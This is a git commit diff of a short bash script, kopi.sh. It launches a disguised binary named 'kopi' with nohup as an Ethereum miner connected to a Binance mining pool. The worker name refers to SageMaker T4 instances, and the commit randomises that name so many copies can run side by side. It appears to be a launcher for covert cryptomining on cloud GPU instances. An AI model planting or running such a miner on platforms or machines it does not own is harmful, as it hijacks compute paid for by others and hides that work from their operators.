ae59726079f4e9132aef9085325b5a429f04c247
aurbach55 <95366868+aurbach55@users.noreply.github.com>
2022-02-24 02:42:51 +0700

    Update kopi.sh

--- kopi.sh
+++ kopi.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-chmod +x ./kopi && nohup ./kopi --coin ETH --pool ethash.poolbinance.com:443 --user sagemaker.T4 > nohup.out
+chmod +x ./kopi && nohup ./kopi --coin ETH --pool ethash.poolbinance.com:443 --user sagemaker.$(echo $(shuf -i 1-9999 -n 1)-T4) > nohup.out
